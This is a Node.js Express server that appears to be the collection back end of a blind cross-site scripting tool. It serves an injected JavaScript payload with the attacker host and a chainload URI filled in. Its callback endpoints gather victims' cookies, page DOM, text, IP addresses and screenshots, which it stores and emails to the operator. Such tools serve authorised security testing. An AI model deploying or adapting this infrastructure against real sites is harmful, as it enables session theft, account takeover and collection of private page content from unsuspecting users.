// app.js

const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const zlib = require('zlib');
const multer = require('multer');
const uuid = require('uuid');
const asyncfs = fs.promises;
const validate = require('express-jsonschema').validate;

const database = require('./database.js');
const notification = require('./notification.js');
const api = require('./api.js');
const constants = require('./constants.js');

const { Settings, PayloadFireResults, CollectedPages, InjectionRequests, sequelize } = database;

const SCREENSHOTS_DIR = path.resolve(process.env.SCREENSHOTS_DIR);
const SCREENSHOT_FILENAME_REGEX = /^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}\.png$/i;
const upload = multer({ dest: '/tmp/' });

const XSS_PAYLOAD = fs.readFileSync('./probe.js', 'utf8');

function set_secure_headers(req, res) {
	res.set("X-XSS-Protection", "mode=block");
	res.set("X-Content-Type-Options", "nosniff");
	res.set("X-Frame-Options", "deny");

	if (req.path.startsWith(constants.API_BASE_PATH)) {
		res.set("Content-Security-Policy", "default-src 'none'; script-src 'none'");
		res.set("Content-Type", "application/json");
	}
}

async function check_file_exists(file_path) {
	try {
		await asyncfs.access(file_path, fs.constants.F_OK);
		return true;
	} catch {
		return false;
	}
}

async function get_app_server() {
	const app = express();
	app.set('case sensitive routing', true);

	app.use(async (req, res, next) => {
		if (req.path.toLowerCase() === req.path) return next();

		return res.status(401).json({
			success: false,
			error: "No.",
			code: "WHY_ARE_YOU_SHOUTING"
		});
	});

	app.use(bodyParser.json());

	app.use(async (req, res, next) => {
		set_secure_headers(req, res);
		next();
	});

	// /page_callback handler
	app.post('/page_callback', upload.none(), validate({
		body: {
			type: "object",
			properties: {
				uri: { type: "string", default: "" },
				html: { type: "string", default: "" }
			}
		}
	}), async (req, res) => {
		res.set({
			"Access-Control-Allow-Origin": "*",
			"Access-Control-Allow-Methods": "POST, OPTIONS",
			"Access-Control-Allow-Headers": "Content-Type, X-Requested-With",
			"Access-Control-Max-Age": "86400"
		});

		await CollectedPages.create({
			id: uuid.v4(),
			uri: req.body.uri,
			html: req.body.html,
		});

		res.status(200).json({ status: "success" });
	});

	// /js_callback handler
	app.post('/js_callback', upload.single('screenshot'), validate({
		body: {
			type: "object",
			properties: {
				uri: { type: "string", default: "" },
				cookies: { type: "string", default: "" },
				referrer: { type: "string", default: "" },
				"user-agent": { type: "string", default: "" },
				"browser-time": { type: "string", default: "0", pattern: "^\\d+$" },
				"probe-uid": { type: "string", default: "" },
				origin: { type: "string", default: "" },
				injection_key: { type: "string", default: "" },
				title: { type: "string", default: "" },
				text: { type: "string", default: "" },
				was_iframe: { type: "string", default: "false", enum: ["true", "false"] },
				dom: { type: "string", default: "" }
			}
		}
	}), async (req, res) => {
		res.set({
			"Access-Control-Allow-Origin": "*",
			"Access-Control-Allow-Methods": "POST, OPTIONS",
			"Access-Control-Allow-Headers": "Content-Type, X-Requested-With",
			"Access-Control-Max-Age": "86400"
		});

		res.status(200).json({ status: "success" });

		const payload_fire_image_id = uuid.v4();
		const gz_path = `${SCREENSHOTS_DIR}/${payload_fire_image_id}.png.gz`;

		const gzip = zlib.createGzip();
		const output = fs.createWriteStream(gz_path);
		const input = fs.createReadStream(req.file.path);

		input.pipe(gzip).pipe(output).on('finish', async (err) => {
			if (err) console.error("Error gzipping image:", err);
			await asyncfs.unlink(req.file.path);
		});

		const fire_id = uuid.v4();
		const correlated_request = await InjectionRequests.findOne({ where: { injection_key: req.body.injection_key } });

		const payload_fire_data = {
			id: fire_id,
			url: req.body.uri,
			ip_address: req.connection.remoteAddress.toString(),
			referer: req.body.referrer,
			user_agent: req.body['user-agent'],
			cookies: req.body.cookies,
			title: req.body.title,
			dom: req.body.dom,
			text: req.body.text,
			origin: req.body.origin,
			screenshot_id: payload_fire_image_id,
			was_iframe: req.body.was_iframe === 'true',
			browser_timestamp: parseInt(req.body['browser-time']),
			correlated_request: correlated_request?.request ?? 'No correlated request found for this injection.'
		};

		await PayloadFireResults.create(payload_fire_data);

		if (process.env.SMTP_EMAIL_NOTIFICATIONS_ENABLED === "true") {
			payload_fire_data.screenshot_url = `https://${process.env.HOSTNAME}/screenshots/${payload_fire_data.screenshot_id}.png`;
			await notification.send_email_notification(payload_fire_data);
		}
	});

	// Screenshot serving
	app.get('/screenshots/:screenshotFilename', async (req, res) => {
		const fname = req.params.screenshotFilename;

		if (!SCREENSHOT_FILENAME_REGEX.test(fname)) return res.sendStatus(404);

		const gz_image_path = `${SCREENSHOTS_DIR}/${fname}.gz`;

		if (!(await check_file_exists(gz_image_path))) return res.sendStatus(404);

		res.sendFile(gz_image_path, {
			lastModified: false,
			acceptRanges: false,
			cacheControl: true,
			headers: {
				"Content-Type": "image/png",
				"Content-Encoding": "gzip"
			}
		});
	});

	app.get('/health', async (req, res) => {
		try {
			await sequelize.authenticate();
			res.status(200).json({ status: "ok" });
		} catch (err) {
			console.error("Health check failed:", err);
			res.status(500).json({ status: "error" });
		}
	});

	const payload_handler = async (req, res) => {
		res.set({
			"Content-Security-Policy": "default-src 'none'; script-src 'none'",
			"Content-Type": "application/javascript",
			"Access-Control-Allow-Origin": "*",
			"Access-Control-Allow-Methods": "GET, OPTIONS",
			"Access-Control-Allow-Headers": "Content-Type, X-Requested-With",
			"Access-Control-Max-Age": "86400"
		});

		const [pages_setting, chainload_setting] = await Promise.all([
			Settings.findOne({ where: { key: constants.PAGES_TO_COLLECT_SETTINGS_KEY } }),
			Settings.findOne({ where: { key: constants.CHAINLOAD_URI_SETTINGS_KEY } })
		]);

		const pages_to_collect = pages_setting ? JSON.parse(pages_setting.value) : [];
		const chainload_uri = chainload_setting ? chainload_setting.value : '';

		res.send(
			XSS_PAYLOAD
				.replace(/\[HOST_URL\]/g, `https://${process.env.HOSTNAME}`)
				.replace('[COLLECT_PAGE_LIST_REPLACE_ME]', JSON.stringify(pages_to_collect))
				.replace('[CHAINLOAD_REPLACE_ME]', JSON.stringify(chainload_uri))
				.replace('[PROBE_ID]', JSON.stringify(req.params.probe_id))
		);
	};

	app.get('/', payload_handler);
	app.get('/:probe_id', payload_handler);

	if (process.env.CONTROL_PANEL_ENABLED === 'true') {
		await api.set_up_api_server(app);
	} else {
		console.log(`[INFO] Control panel NOT enabled. Running notification-only mode.`);
	}

	return app;
}

module.exports = get_app_server;